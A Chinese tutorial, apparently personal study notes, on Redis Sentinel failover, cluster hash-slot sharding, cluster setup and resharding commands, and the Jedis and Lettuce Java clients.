<h3 id="多层主从"><a href="#多层主从" class="headerlink" title="多层主从"></a>多层主从</h3><p><code>slaveof 主库IP 主库端口</code></p>
<p>上一个slave可以是下一个slave的master,slave同样可以接收其他slave的连接和同步请求，有效减轻主mater的压力。</p>
<p>如果slave切换master，会清除原本的数据，与新master同步。</p>
<p><strong>只有最顶层Master能够执行写操作。</strong></p>
<h3 id="脱离主机"><a href="#脱离主机" class="headerlink" title="脱离主机"></a>脱离主机</h3><p><code>slaveof no one</code>，脱离后原数据仍然保存。</p>
<h2 id="八、哨兵"><a href="#八、哨兵" class="headerlink" title="八、哨兵"></a>八、哨兵</h2><p>企业一般采取的两种Redis分布式方案：</p>
<ul>
<li>哨兵（多台哨兵）+主从复制</li>
<li>集群</li>
</ul>
<p>Redis的哨兵机制是一种高可用性解决方案。它通过哨兵节点（独立于主从节点的节点，不存放数据）监控Redis主从节点的运行状态，当主节点故障时，能自动通过**<code>投票机制</code>**进行主从切换，将一个从节点晋升为主节点并通知其他从节点更新配置，从而实现故障转移，提高系统可用性。同时，哨兵之间也会相互监控，通常使用多个哨兵节点以增强可靠性。</p>
<h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p><strong>注意：</strong>主从机验证密码应当一致，否则主机宕机后哨兵可能无法访问新主机。</p>
<p><strong>注意：</strong>配置主从关系时，主机也需要配置<code>masterauth</code>，否则原主机恢复后无法加入主从关系，，出现<code>master_link_status:down</code>错误。</p>
<p>基本配置流程如下：</p>
<ol>
<li>在redis.conf配置文件所在目录下新建或从解压包目录拷贝<code>sentinel.conf</code>文件，必须以此命名。</li>
<li>同样修改<code>bind</code>, <code>daemonize</code>, <code>protected-mode</code>, <code>port</code>（默认26379）, <code>logfile</code>，<code>pidfile</code>，<code>dir</code>等项。</li>
<li><code>sentinel monitor &lt;master-name&gt; &lt;ip&gt; &lt;redis-port&gt; &lt;quorum&gt;</code>：设置需要监控的master服务器，<code>quorum</code>表示最少需要多少个哨兵服务器同意迁移才能迁移的法定票数（<strong>客观下线</strong>）。哨兵通过心跳包确认主节点的状态，可能因为多种原因导致误判，因此最低票数可以避免误判。</li>
<li><code>sentinel auth-pass &lt;master-name&gt; &lt;password&gt;</code>：设置主节点的登录密码。</li>
</ol>
<p>最终配置示例：</p>
<p><img src="D:\workinenglish\typora_image\image-20250213165720953.png" alt="image-20250213165720953"></p>
<p>其他配置项：</p>
<p><img src="D:\workinenglish\typora_image\image-20250213165230437.png" alt="image-20250213165230437"></p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>使用命令指定conf文件启动哨兵</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-sentinel sentinel26381.conf --sentinel</span><br></pre></td></tr></table></figure>



<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>主机宕机后哨兵将立即开始选举投票，从原来的从机中产生新的主机（获得票数超过客观下线的）。</p>
<p>产生新的主机后，原从机的第一次获取数据仍可能失败（原因：broken pipe)，后续可以成功。</p>
<p><strong>原宕机的主机恢复后，会成为从机，无法恢复主机地位。</strong></p>
<p><strong>配置文件的内容在运行期间会被sentinel动态修改</strong></p>
<ul>
<li><p>一次宕机重选后，哨兵配置文件中会新增配置项指定其新的监控目标。</p>
</li>
<li><p>原主机宕机后重新加入主从关系成为从机后，其（原主机）配置文件会增加一些配置用于指定其主机。</p>
</li>
<li><p>原主机宕机恢复后成为新主机的从机，其（新主机）配置文件中指定其主机的配置项会被修改。</p>
</li>
</ul>
<h3 id="哨兵的运行流程和选举原理"><a href="#哨兵的运行流程和选举原理" class="headerlink" title="哨兵的运行流程和选举原理"></a>哨兵的运行流程和选举原理</h3><h4 id="Redis-哨兵的运行流程"><a href="#Redis-哨兵的运行流程" class="headerlink" title="Redis 哨兵的运行流程"></a>Redis 哨兵的运行流程</h4><h5 id="（1）初始化阶段"><a href="#（1）初始化阶段" class="headerlink" title="（1）初始化阶段"></a>（1）<strong>初始化阶段</strong></h5><ul>
<li>每个哨兵进程启动后，会读取配置文件 <code>sentinel.conf</code>中的配置信息</li>
<li>哨兵通过 <code>PUBLISH/SUBSCRIBE</code> 机制与其他哨兵通信，形成一个分布式系统。</li>
</ul>
<h5 id="（2）监控主从节点"><a href="#（2）监控主从节点" class="headerlink" title="（2）监控主从节点"></a>（2）<strong>监控主从节点</strong></h5><ul>
<li>心跳检测<ul>
<li>哨兵定期向主节点、从节点和其他哨兵发送 <code>PING</code> 命令，检测其健康状态。</li>
<li>如果某个节点在指定时间内未响应 <code>PING</code>，哨兵会将其标记为“<strong>主观下线</strong>”（Subjectively Down, SDOWN）。</li>
</ul>
</li>
<li>信息同步：哨兵通过订阅主节点的 <code>__sentinel__:hello</code> 频道，与其他哨兵交换信息，确保所有哨兵对集群状态达成一致。</li>
</ul>
<h5 id="（3）客观下线判断"><a href="#（3）客观下线判断" class="headerlink" title="（3）客观下线判断"></a>（3）<strong>客观下线判断</strong></h5><ul>
<li>当一个哨兵认为主节点不可用时，它会与其他哨兵协商。</li>
<li>如果至少有 <code>quorum</code> 个哨兵同意主节点不可用，则主节点被标记为“<strong>客观下线</strong>”（Objectively Down, ODOWN）。</li>
</ul>
<h5 id="（4）领导者选举"><a href="#（4）领导者选举" class="headerlink" title="（4）领导者选举"></a>（4）<strong>领导者选举</strong></h5><ul>
<li>在主节点进入 ODOWN 状态后，哨兵群体<strong>会通过 Raft 协议选举出一个领导者哨兵。</strong></li>
<li>领导者哨兵负责执行故障转移操作。</li>
</ul>
<h5 id="（5）故障转移"><a href="#（5）故障转移" class="headerlink" title="（5）故障转移"></a>（5）<strong>故障转移</strong></h5><ul>
<li>领导者哨兵选择一个健康的从节点升级为主节点（规则见下文）。</li>
<li>更新其他从节点的配置，使其同步新主节点的数据。</li>
<li>向客户端通知新的主节点地址。</li>
</ul>
<h5 id="（6）恢复与重新配置"><a href="#（6）恢复与重新配置" class="headerlink" title="（6）恢复与重新配置"></a>（6）<strong>恢复与重新配置</strong></h5><ul>
<li>故障修复后，原主节点会被降级为从节点，继续同步数据</li>
</ul>
<h4 id="Raft协议"><a href="#Raft协议" class="headerlink" title="Raft协议"></a>Raft协议</h4><p>Raft 是一种分布式一致性算法，主要用于解决分布式系统中的领导者选举问题。其核心思想是通过投票机制选出唯一的领导者，确保系统决策的一致性。<strong>最终实际上是最先发起选举请求的哨兵会被选举为领导者（先到先得）</strong></p>
<p><strong>选举流程</strong></p>
<ul>
<li><p><strong>发起选举</strong> ：当主节点进入 ODOWN 状态时，任意一个哨兵可以发起选举。发起选举的哨兵会向其他哨兵发送 <code>SENTINEL is-master-down-by-addr</code> 命令，请求投票。</p>
</li>
<li><p><strong>投票规则</strong>  </p>
<ul>
<li>每个哨兵只能投给一个候选人。</li>
<li>候选人需要获得超过半数（即多数派，Majority Vote）的票数才能当选领导者。</li>
</ul>
</li>
<li><p><strong>先到先得原则</strong></p>
<ul>
<li>每个哨兵会在随机延迟后发起选举请求，以减少同时竞争的可能性。</li>
<li>如果某个哨兵首先发起了选举请求，并且其他哨兵尚未收到更优的候选人信息，则会将票投给该哨兵。</li>
</ul>
</li>
<li><p><strong>选举结果</strong>  </p>
<ul>
<li>如果某个哨兵获得多数票，则成为领导者哨兵。</li>
<li>如果没有哨兵获得多数票，可能会触发新一轮选举。</li>
</ul>
</li>
</ul>
<h4 id="Master选举流程"><a href="#Master选举流程" class="headerlink" title="Master选举流程"></a>Master选举流程</h4><ul>
<li><p>新主登基：某个slave 备选成为新 master，按如下原则：</p>
<blockquote>
<p>领导者哨兵优先选择优先级高（由redis6<code>slave-priority</code>配置项或redis7<code>replica-priority</code>配置项决定，越小越高）的从机为主机，优先级一致时选择数据量多（复制偏移offset最大的从节点）的为主机，数据量一致时选择<code>Run Id</code>最小的为主机</p>
</blockquote>
</li>
<li><p>群臣俯首：一朝天子一朝臣，重新认老大</p>
<blockquote>
<p>哨兵领导会要求被选为主机的从机执行<code>slaveof no one</code>命令将其提升为主节点，其他从机执行<code>slaveof</code>命令成为新主节点的从节点。</p>
</blockquote>
</li>
<li><p>旧主拜服：老master回来也得怂  </p>
<blockquote>
<p>哨兵领导会让原主节点成为新主节点的从节点</p>
</blockquote>
</li>
</ul>
<h3 id="哨兵使用建议"><a href="#哨兵使用建议" class="headerlink" title="哨兵使用建议"></a>哨兵使用建议</h3><ul>
<li>哨兵节点数量应为多个（&gt;&#x3D;3）且应当<strong>奇数</strong>，保证高可用性</li>
<li>各哨兵节点配置应当一致</li>
<li>如果哨兵节点部署在Docker等容器中，需要注意端口的正确映射。</li>
<li><strong>哨兵+主从复制不能保证数据零丢失！</strong>从机可能本来就没有及时复制主机数据。</li>
</ul>
<h2 id="九、集群"><a href="#九、集群" class="headerlink" title="九、集群"></a>九、集群</h2><p>哨兵+主从复制机制存在的问题：一旦主机宕机，选举和转移新主机需要时间，导致这段时间内无法进行写操作。</p>
<p>Redis 集群是一种分布式架构，用于解决单机 Redis 的容量和性能瓶颈问题。它通过将数据分布在多个节点上，提供更高的可用性和扩展性。</p>
<ol>
<li>集群支持多个主节点，每个主节点又可以挂载多个从节点，从而实现读写分离、数据的高可用和海量数据的读写存储操作。</li>
<li>自带哨兵故障转移机制，无需再使用哨兵功能</li>
<li>客户端与Redis的节点连接只需要连接到集群中任一个可用节点即可。</li>
<li>槽位Slot负责分配到各个物理服务节点，由对应集群来负责维护节点、插槽和数据组建的关系</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250213215031.png"></p>
<h3 id="集群的算法"><a href="#集群的算法" class="headerlink" title="集群的算法"></a>集群的算法</h3><p>Redis建议集群节点数量不超过1000.</p>
<h4 id="槽位和分片"><a href="#槽位和分片" class="headerlink" title="槽位和分片"></a>槽位和分片</h4><p>Redis集群的数据分片</p>
<ul>
<li>Redis 集群通过分片机制将数据分布到多个节点，每个节点(包含一个主节点和若干从节点）就是整个数据的一个分片。</li>
<li>数据按照哈希槽（Hash Slot）分配，集群中共有 <strong>16384 个哈希槽</strong>。</li>
<li>每个键的哈希值通过公式 <code>CRC16(key) % 16384</code> 映射到一个具体的哈希槽。</li>
<li>每个节点负责一部分哈希槽，从而实现数据的分布式存储</li>
</ul>
<p>通过上述方法，可以准确找到每一个key对应的哈希槽及其对应分片，同时也便于添加&#x2F;删除节点。</p>
<h4 id="哈希映射算法"><a href="#哈希映射算法" class="headerlink" title="哈希映射算法"></a>哈希映射算法</h4><p>业界常用的哈希映射算法有三种：</p>
<h5 id="哈希取余分区"><a href="#哈希取余分区" class="headerlink" title="哈希取余分区"></a>哈希取余分区</h5><p>将key的哈希值对节点数取余分区，</p>
<ul>
<li>优点：简单粗暴，直接有效</li>
<li>缺陷：新增节点将导致全部节点数据混乱，需要重新整理全部节点的数据。</li>
</ul>
<h5 id="一致性哈希算法分区"><a href="#一致性哈希算法分区" class="headerlink" title="一致性哈希算法分区"></a>一致性哈希算法分区</h5><p>一个哈希算法能产生的哈希值和哈希值的数量是确定的，我们将哈希算法能产生的最小哈希值和最大哈希值连起来，就构成了一个哈希值环，由此算法产生的哈希值会全部落到此环上。对服务器IP取哈希，其值同样落在此环上。如果key的哈希值落在从上一个服务器IP哈希值到本服务器IP哈希值的范围内，则其属于当前服务器。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250213222256.png"></p>
<ul>
<li>优点：相对取余算法有容错性和扩展性</li>
<li>缺陷：数据倾斜问题，即数据可能集中在部分服务器上</li>
</ul>
<h5 id="哈希槽分区"><a href="#哈希槽分区" class="headerlink" title="哈希槽分区"></a>哈希槽分区</h5><p>Redis 集群根据键的哈希值计算槽号：<code>slot = CRC16(key) % 16384</code>，将所有数据均匀分配到 <strong>16384 个哈希槽</strong> 中，每个槽可以由集群中的一个节点负责存储。每个节点负责一部分哈希槽，管理员可以手动分配或调整槽的分布。</p>
<p><strong>为什么REDIS集群的最大槽位是16834</strong></p>
<p>Redis的心跳数据包带有节点的完整配置，包含一个消息头，其大小被设定为槽位数&#x2F;8，若太多哈希槽则会导致消息头过大，同时16384个消息头已经可以满足1000个节点的需要。此外，Redis节点负责的哈希槽是通过一张bitmap的形式保存在配置信息中的，在传输过程中会对bitmap进行压缩，但是如果bitmap的填充率slots &#x2F; N很高的话(N表示节点数)，bitmap的压缩率就很低。 如果节点数很少，而哈希槽数量很多的话，bitmap的压缩率同样会很低。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250213225947.png"></p>
<h3 id="集群的搭建示例"><a href="#集群的搭建示例" class="headerlink" title="集群的搭建示例"></a>集群的搭建示例</h3><h4 id="三主三从搭建"><a href="#三主三从搭建" class="headerlink" title="三主三从搭建"></a>三主三从搭建</h4><p>步骤1：建议在redis工作目录下新建cluster目录用于存储集群配置文件</p>
<p>步骤2：集群配置文件可以直接新建<code>.conf</code>文件并确保如下配置项。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">bind</span> <span class="string">0.0.0.0</span></span><br><span class="line"><span class="attr">daemonize</span> <span class="string">yes</span></span><br><span class="line"><span class="attr">protected-mode</span> <span class="string">no</span></span><br><span class="line"><span class="comment"># 具体端口取决于需要</span></span><br><span class="line"><span class="attr">port</span> <span class="string">6381</span></span><br><span class="line"><span class="comment"># /myredis是redis工作目录</span></span><br><span class="line"><span class="attr">logfile</span> <span class="string">&quot;/myredis/cluster/cluster6381.log&quot;</span></span><br><span class="line"><span class="attr">pidfile</span> <span class="string">&quot;/myredis/cluster6381.pid&quot;</span></span><br><span class="line"><span class="attr">dir</span> <span class="string">/myredis/cluster</span></span><br><span class="line"><span class="attr">dbfilename</span> <span class="string">dump6381.rdb</span></span><br><span class="line"><span class="attr">appendonly</span> <span class="string">yes</span></span><br><span class="line"><span class="attr">appendfilename</span> <span class="string">&quot;appendonly6381.aof&quot;</span></span><br><span class="line"><span class="attr">requirepass</span> <span class="string">12345</span></span><br><span class="line"><span class="attr">masterauth</span> <span class="string">12345</span></span><br><span class="line"><span class="comment"># 集群配置</span></span><br><span class="line"><span class="comment"># 开启集群</span></span><br><span class="line"><span class="attr">cluster-enabled</span> <span class="string">yes</span></span><br><span class="line"><span class="comment"># 集群配置文件</span></span><br><span class="line"><span class="attr">cluster-config-file</span> <span class="string">nodes-6381.conf</span></span><br><span class="line"><span class="comment"># 集群节点超时时间</span></span><br><span class="line"><span class="attr">cluster-node-timeout</span> <span class="string">5000</span></span><br></pre></td></tr></table></figure>

<p>步骤3：启动所有REDIS服务，命令类似：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server ./cluster6381.conf</span><br></pre></td></tr></table></figure>

<p>步骤4：使用命令构建主从集群关系(受条件限制，一主一从均在同一物理机上)，注意，集群需要通过总线相互通信，否则可能会卡在<code>Waiting for the cluster to join</code>，解决方案见总结&#x3D;》问题排查</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> --cluste-replicas 1表示每个主节点一个从节点，此后填写ip:port</span></span><br><span class="line">redis-cli -a 12345 --cluster create --cluster-replicas 1 192.168.52.162:6381 192.168.52.163:6383 192.168.52.164:6385 192.168.52.162:6382 192.168.52.163:6384 192.168.52.164:6386</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">yes</span></span></span><br></pre></td></tr></table></figure>

<p>步骤5：连接成功，可以在客户端使用<code>cluster nodes</code>查看集群状态</p>
<h4 id="集群的读写"><a href="#集群的读写" class="headerlink" title="集群的读写"></a>集群的读写</h4><h5 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h5><p>由于集群中按节点分配了哈希槽，当使用原来的方式添加数据时，如果添加的键不在当前连接节点负责的哈希槽内，会报错而无法添加，需要路由机制。在 Redis 集群中，<strong>路由机制</strong> 是指客户端如何根据键（key）找到负责存储该键值对的节点。其核心基于 <strong>哈希槽（Hash Slot）</strong> 的分配规则。Redis 集群的路由机制通过哈希槽实现键到节点的映射，客户端根据键的哈希值直接访问目标节点，必要时通过 MOVED 或 ASK 响应进行重定向。</p>
<ol>
<li><p><strong>哈希槽计算</strong>  </p>
<ul>
<li>客户端通过公式 <code>slot = CRC16(key) % 16384</code> 计算键所属的哈希槽。</li>
<li>每个哈希槽被分配到集群中的某个主节点上。</li>
</ul>
</li>
<li><p><strong>直接路由</strong>  </p>
<ul>
<li>客户端根据计算出的哈希槽，直接连接到负责该槽的主节点进行操作（读或写）。</li>
</ul>
</li>
<li><p><strong>重定向机制</strong>  </p>
<ul>
<li>如果客户端连接到了错误的节点，目标节点会返回以下两种响应之一：<ul>
<li><strong>MOVED</strong>：表示该键属于另一个节点，客户端需要重新连接到指定节点。</li>
<li><strong>ASK</strong>：在数据迁移过程中，目标节点可能要求客户端先处理部分数据后再重定向。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>登陆客户机时，需要添加<code>-c</code>参数，表示启用路由重定向。如果添加到key不属于当前节点的哈希槽，会被重定向迁移到属于的节点。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a 12345 -p 6381 -c</span><br></pre></td></tr></table></figure>

<p><strong>查看某个键属于哪个槽位：</strong>可以结合<code>cluster nodes</code>命令得到键在哪个节点。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cluster keyslot k1</span><br></pre></td></tr></table></figure>



<h4 id="手动故障转移-节点从属调整"><a href="#手动故障转移-节点从属调整" class="headerlink" title="手动故障转移&amp;节点从属调整"></a>手动故障转移&amp;节点从属调整</h4><p>节点中主节点宕机，从节点会立即接替成为主节点。原主节点回归会以从节点身份。</p>
<p>使用<code>CLUSTER FAILOVER</code>命令可以实现手动故障转移，执行此命令的从节点会转为主节点，其主节点会传为它的从节点</p>
<h3 id="集群扩容"><a href="#集群扩容" class="headerlink" title="集群扩容"></a>集群扩容</h3><h4 id="新节点加入原有集群"><a href="#新节点加入原有集群" class="headerlink" title="新节点加入原有集群"></a>新节点加入原有集群</h4><p>步骤0：</p>
<ul>
<li><strong>重要！非常重要！：</strong><code>必须设置防火墙允许redis的通信端口和集群通信端口的TCP通信并重启防火墙！</code></li>
</ul>
<p>步骤1：分别启动新节点主从节点服务。</p>
<p>步骤2：将新节点主节点作为master加入原有集群</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a 登陆密码 --cluster add-node 自己的IP:Port 原集群中某主节点的IP:Port </span><br></pre></td></tr></table></figure>

<p>如：<code>redis-cli -a 12345 --cluster add-node 192.168.52.162:6388 192.168.52.164:6385</code></p>
<p>步骤3：确认是否加入成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a 12345 --cluster check 集群内任一节点的IP:Port</span><br></pre></td></tr></table></figure>



<h4 id="重新分配槽位"><a href="#重新分配槽位" class="headerlink" title="重新分配槽位"></a>重新分配槽位</h4><p>步骤4：重新分配槽位，从原有的每一个节点中分出部分槽位给新节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a 12345 --cluster reshard 旧节点的IP:Port </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果节点成功加入集群，实际上也可以是新节点的IP:Port，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">但可能新节点没有成功加入，出现问题3，所以建议使用旧节点，没有成功加入时此步会直接报错</span></span><br></pre></td></tr></table></figure>

<p>如：<code>redis-cli -a 12345 --cluster reshard 旧节点的IP:Port </code>。</p>
<p>接下来会有四次要求输入，第一次输入分出的槽位数，第二次输入新节点的<code>id</code>，第三次为附件意见，一般填<code>all</code>，第四次为<code>yes。</code></p>
<p>步骤5：确认槽位分配成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a 12345 --cluster check 集群内任一节点的IP:Port</span><br></pre></td></tr></table></figure>

<p>说明：会从每个旧节点中分配一部分给新节点</p>
<h4 id="添加新节点的从节点"><a href="#添加新节点的从节点" class="headerlink" title="添加新节点的从节点"></a>添加新节点的从节点</h4><p>步骤6：为新节点添加从节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a 12345 --cluster add-node 从节点IP:Port 主节点IP:Port --cluster-slave --cluster-master-id 主节点ID</span><br></pre></td></tr></table></figure>

<p>同样可以检查是否成功。</p>
<h3 id="集群缩容"><a href="#集群缩容" class="headerlink" title="集群缩容"></a>集群缩容</h3><h4 id="从集群中清除从机"><a href="#从集群中清除从机" class="headerlink" title="从集群中清除从机"></a>从集群中清除从机</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a 12345 --cluster del-node 从机IP:Port 从机Id</span><br></pre></td></tr></table></figure>

<h4 id="将废弃节点槽位分给其他节点"><a href="#将废弃节点槽位分给其他节点" class="headerlink" title="将废弃节点槽位分给其他节点"></a>将废弃节点槽位分给其他节点</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a 12345 --cluster reshard 任一其他节点IP:Port</span><br></pre></td></tr></table></figure>

<p>将有五次输入：</p>
<ul>
<li>第一次要求输入转移的槽位数，将废弃节点的所有槽位转移</li>
<li>第二次要求输入接收节点ID</li>
<li>第三次要求输入废弃节点ID</li>
<li>第四次输入done</li>
<li>第五次输入yes</li>
</ul>
<p>废弃节点会从主节点转为接收节点的从节点</p>
<h4 id="将成为从节点的废弃节点清除"><a href="#将成为从节点的废弃节点清除" class="headerlink" title="将成为从节点的废弃节点清除"></a>将成为从节点的废弃节点清除</h4><p>同1.</p>
<h3 id="集群其他知识"><a href="#集群其他知识" class="headerlink" title="集群其他知识"></a>集群其他知识</h3><h5 id="缺陷与解决：不在同一节点的key无法使用多键操作"><a href="#缺陷与解决：不在同一节点的key无法使用多键操作" class="headerlink" title="缺陷与解决：不在同一节点的key无法使用多键操作"></a>缺陷与解决：不在同一节点的key无法使用多键操作</h5><p>缺陷：不在同一节点的key无法使用多键操作（如mset、mget）</p>
<p>解决方案：使用<code>&#123;&#125;</code>定义同一组概念，使得<code>&#123;&#125;</code>中内容相同的键值对放在同一个槽位，都映射到<code>&#123;&#125;</code>中内容的哈希值</p>
<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mset k1&#123;k&#125; v1 k2&#123;k&#125; v2 k3&#123;k&#125; v3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">全部映射到 k,此后可以使用单键操作命令操作，但键是k1&#123;k&#125; 而不是k1</span></span><br></pre></td></tr></table></figure>



<h4 id="CRC16源码"><a href="#CRC16源码" class="headerlink" title="CRC16源码"></a>CRC16源码</h4><p>在cluster下的keyHashSlot函数中调用。</p>
<h4 id="其他常用命令-配置"><a href="#其他常用命令-配置" class="headerlink" title="其他常用命令|配置"></a>其他常用命令|配置</h4><p>其他常用命令&#x2F;配置如下：</p>
<ul>
<li>配置项<code>cluster-require-full-coverge</code>：是否要求集群完整（如果某节点的主从节点均已损毁，则集群不完整。）对外提供服务，默认为yes。</li>
<li><code>cluster countkeysinslot slotnum</code>：slotnum为槽位编号，该命令可以判断槽位是否被占用。</li>
<li><code>cluster keyslot key</code>：查看键应该存在哪一个槽位上</li>
</ul>
<h2 id="十、SpringBoot集成"><a href="#十、SpringBoot集成" class="headerlink" title="十、SpringBoot集成"></a>十、SpringBoot集成</h2><table>
<thead>
<tr>
<th>特性&#x2F;工具</th>
<th>Jedis</th>
<th>Lettuce</th>
<th>RedisTemplate</th>
</tr>
</thead>
<tbody><tr>
<td><strong>类型</strong></td>
<td>Redis 客户端</td>
<td>Redis 客户端</td>
<td>Spring 抽象层</td>
</tr>
<tr>
<td><strong>API 类型</strong></td>
<td>阻塞式</td>
<td>非阻塞式</td>
<td>抽象式</td>
</tr>
<tr>
<td><strong>连接管理</strong></td>
<td>手动管理（需连接池）</td>
<td>自动管理</td>
<td>自动管理</td>
</tr>
<tr>
<td><strong>性能</strong></td>
<td>中等</td>
<td>高</td>
<td>中等</td>
</tr>
<tr>
<td><strong>复杂度</strong></td>
<td>低</td>
<td>中</td>
<td>中</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>小型项目、低并发场景</td>
<td>高并发、分布式系统</td>
<td>Spring 项目、复杂场景</td>
</tr>
<tr>
<td><strong>是否支持 Cluster</strong></td>
<td>需额外配置</td>
<td>原生支持</td>
<td>原生支持</td>
</tr>
</tbody></table>
<h3 id="Jedis驱动包"><a href="#Jedis驱动包" class="headerlink" title="Jedis驱动包"></a>Jedis驱动包</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p><strong>Jedis</strong> 是一个简单易用的 Redis Java <strong>客户端</strong>，由 GitHub 开源社区维护。它通过直接连接 Redis 实例的方式提供对 Redis 的操作支持。</p>
<p><strong>特点</strong></p>
<ul>
<li><strong>轻量级</strong>：代码结构简单，易于上手。</li>
<li><strong>阻塞式 API</strong>：每个命令都以同步方式执行，调用线程会被阻塞直到命令完成。</li>
<li><strong>连接管理</strong>：需要手动管理连接（如创建和关闭），但可以通过连接池（如 <code>JedisPool</code>）优化性能。</li>
</ul>
<p><strong>优点</strong></p>
<ul>
<li>简单易用，适合快速开发。</li>
<li>支持所有 Redis 命令。</li>
<li>社区活跃，文档丰富。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>阻塞式设计</strong>：在高并发场景下可能导致性能瓶颈。</li>
<li><strong>连接管理复杂</strong>：需要开发者手动管理连接池，容易出现资源泄漏问题。</li>
<li>不支持异步操作和 Redis Cluster 的部分高级功能。</li>
</ul>
<h4 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h4><h5 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJedis</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 1.通过IP和端口连接客户端</span></span><br><span class="line">    <span class="type">Jedis</span> <span class="variable">jedis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jedis</span>(<span class="string">&quot;192.168.52.162&quot;</span>,<span class="number">6381</span>);</span><br><span class="line">    <span class="comment">// 2.指定访问服务器的密码</span></span><br><span class="line">    jedis.auth(<span class="string">&quot;12345&quot;</span>);</span><br><span class="line">    <span class="comment">// 验证连接</span></span><br><span class="line">    System.out.println(jedis.ping());</span><br><span class="line">    <span class="comment">// 命令keys *</span></span><br><span class="line">    Set&lt;String&gt; keys = jedis.keys(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    System.out.println(keys);</span><br><span class="line">    <span class="comment">// set k1 v1</span></span><br><span class="line">    jedis.set(<span class="string">&quot;k10&quot;</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    System.out.println(jedis.get(<span class="string">&quot;k10&quot;</span>));</span><br><span class="line">    <span class="comment">// 命令和方法名一致，其他命令可以类似使用</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>







<h3 id="Lettuce驱动包"><a href="#Lettuce驱动包" class="headerlink" title="Lettuce驱动包"></a><strong>Lettuce</strong>驱动包</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h4><p><strong>Lettuce</strong> 是另一个 Redis Java 客户端，由 Redis 官方推荐。它基于 Netty 框架实现，支持非阻塞式 I&#x2F;O 操作。</p>
<p><strong>特点</strong></p>
<ul>
<li><strong>非阻塞式 API</strong>：采用反应式编程模型（Reactive Programming），支持异步操作。</li>
<li><strong>单个连接复用</strong>：多个线程可以共享同一个 Redis 连接，减少连接开销。</li>
<li><strong>全面支持 Redis Cluster</strong>：内置对 Redis Cluster 的原生支持，无需额外配置。</li>
</ul>
<p><strong>优点</strong></p>
<ul>
<li>性能优越，适合高并发场景。</li>
<li>内置连接池管理，减少资源泄漏风险。</li>
<li>支持异步操作和反应式编程。</li>
<li>更好地适配 Redis Cluster 和 Sentinel 模式。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>学习曲线较陡，尤其是对反应式编程不熟悉的开发者。</li>
<li>配置相对复杂，需要更多初始化工作。</li>
</ul>
